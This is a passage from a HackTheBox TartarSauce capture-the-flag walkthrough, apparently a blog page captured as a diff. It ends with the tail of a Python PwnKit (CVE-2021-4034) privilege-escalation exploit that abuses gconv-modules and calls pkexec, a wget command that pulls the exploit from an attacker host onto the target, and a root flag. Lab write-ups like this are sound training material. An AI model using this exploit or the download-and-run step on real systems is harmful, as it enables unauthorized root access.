+</span></span><span class="line"><span class="cl"><span class="c1"># Create gconf config file</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;exploit/gconv-modules&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;module  UTF-8//    INTERNAL    ../payload    2</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Failed to create gconf-modules config file.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Convert the environment to an array of char*</span>
+</span></span><span class="line"><span class="cl"><span class="n">environ_p</span> <span class="o">=</span> <span class="p">(</span><span class="n">c_char_p</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">environ</span><span class="p">))()</span>
+</span></span><span class="line"><span class="cl"><span class="n">environ_p</span><span class="p">[:]</span> <span class="o">=</span> <span class="n">environ</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Calling execve()&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Call execve() with NULL arguments</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/usr/bin/pkexec&#39;</span><span class="p">,</span> <span class="n">c_char_p</span><span class="p">(</span><span class="kc">None</span><span class="p">),</span> <span class="n">environ_p</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s wget it over onto the victim machine and try it out.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://10.10.14.6/exploit.py
+</span></span><span class="line"><span class="cl">python exploit.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/root.png"
+	width="606"
+	height="306"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/root_hub9481f3c87aa65a6fa547d77b007c071_75871_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/root_hub9481f3c87aa65a6fa547d77b007c071_75871_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="root"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="475px"
+	
+><br>
+Rooted!</p>
+<h4 id="root-flag">Root Flag</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /root/root.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Root Flag: <strong>4f0aed278511146b1aabf76da1261db7</strong></p>
+<h2 id="additional-notes">Additional Notes</h2>
+<p>After rooting this box, I looked at writeups from others to compare the process I followed to theirs and noticed a few very interesting differences. Firstly, a lot of the writeups I saw got much deeper into a rabbit hole before finding the WordPress site which is where I directed my early focus. More interestingly, however, is that I am the only one it seems who used CVE-2021-4034 for privelege escalation to root. It appears that there was a system timer running a custom backup script as root that could be exploited. This makes sense since the box came out in 2018 and this was a 2021 exploit. Goes to show that there are multiple ways to break a box and that even if you get root, checking others&rsquo; work can still help you learn more!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/hackthebox/">HackTheBox</a>
+        
+            <a href="/tags/wordpress/">WordPress</a>
+        
+            <a href="/tags/rfi/">RFI</a>
+        
+            <a href="/tags/cve-2021-4034/">CVE-2021-4034</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-lame-walkthrough-w/o-metasploit/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/Lame.1e866642229f0954d06e36e6a361f522_hu4205851be0a2e9cddbb11c4baa04b892_365849_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox Lame Walkthrough (w/o Metasploit)"
+                        
+                        data-hash="md5-HoZmQiKfCVTQbjbmo2H1Ig==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox Lame Walkthrough (w/o Metasploit)</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 novaah.xyz
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
